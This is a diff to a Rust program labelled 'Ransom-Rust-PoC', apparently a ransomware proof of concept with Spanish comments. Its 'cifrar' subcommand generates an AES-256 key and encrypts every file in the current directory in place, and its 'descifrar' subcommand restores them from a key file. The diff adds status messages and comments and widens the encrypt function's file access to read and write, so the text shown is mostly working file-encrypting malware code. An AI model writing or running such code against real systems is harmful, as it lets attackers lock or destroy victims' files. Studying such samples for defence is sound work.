@@ -7,6 +7,7 @@ use std::io::{Read, Write};
 use std::path::Path;
 
 fn main() {
+    // Argumentos
     let matches = App::new("Ransom-Rust-PoC")
         .version("0.1")
         .author("Ricardo M. Prieto (rchip)")
@@ -15,7 +16,8 @@ fn main() {
         .get_matches();
 
     if let ("cifrar", Some(_)) = matches.subcommand() {
-        println!("{}", "cifrando");
+        // Verificar el subcomando cifrar
+        println!("Cifrando archivos...");
         let key = genera_clave_cifrado();
         // Llamada a generar clave, devuleve la clave de 32bytes
         let cifrar_aes = AesSafe256Encryptor::new(&key);
@@ -28,11 +30,14 @@ fn main() {
             cifrar_archivos(&archivo, cifrar_aes);
             // Ciframos todo archivo en función del path y el cifrador
         }
+        println!("Operación Terminada");
     }
 
     if let ("descifrar", Some(_)) = matches.subcommand() {
-        println!("{}", "descifrando");
+        // verificar el subcomando descifrar
+        println!("Descifrando archivos...");
         let mut archivo_clave = File::open("../clave.key").expect("No se puede leer el archivo");
+        // Abrir el archivo clave.key
         let mut key: Vec<u8> = Vec::<u8>::new();
         archivo_clave.read_to_end(&mut key).unwrap();
         // Llamada a generar clave, devuleve la clave de 32bytes
@@ -40,13 +45,14 @@ fn main() {
         // Creamos el cifrador con la clave
 
         for archivo in read_dir("./").unwrap() {
+            //println!("{:?}", &archivo.unwrap());
             // Leemos los archivos que están en el directorio
             let archivo = archivo.unwrap().path();
-            println!("{:?}", archivo);
             // Extraemos el path de cada archivo
             descifrar_archivos(&archivo, descifrar_aes);
             // Ciframos todo archivo en función del path y el cifrador
         }
+        println!("Operación terminada");
     }
 }
 
@@ -68,7 +74,7 @@ fn genera_clave_cifrado() -> [u8; 32] {
 }
 
 fn cifrar_archivos(path: &Path, cifrar_aes: AesSafe256Encryptor) -> () {
-    if let Ok(file) = OpenOptions::new().write(true).open(path) {
+    if let Ok(file) = OpenOptions::new().write(true).read(true).open(path) {
         // Comprobar que el archivo se puede abrir como escritura
         if let Ok(content) = read(path) {
             // Comprobamos si podemos leer el contenido del archivo
@@ -83,7 +89,7 @@ fn cifrar_archivos(path: &Path, cifrar_aes: AesSafe256Encryptor) -> () {
 
 fn descifrar_archivos(path: &Path, descifrar_aes: AesSafe256Decryptor) -> () {
     if let Ok(file) = OpenOptions::new().read(true).write(true).open(path) {
-        // Comprobar que el archivo se puede abrir como escritura
+        // Comprobar que el archivo se puede abrir como escritura y lectura
         if let Ok(mut reader) = AesReader::new(file, descifrar_aes) {
             // Comprobamos si se puede leer el archivo y descifrar
             let mut contenido: Vec<u8> = Vec::<u8>::new();
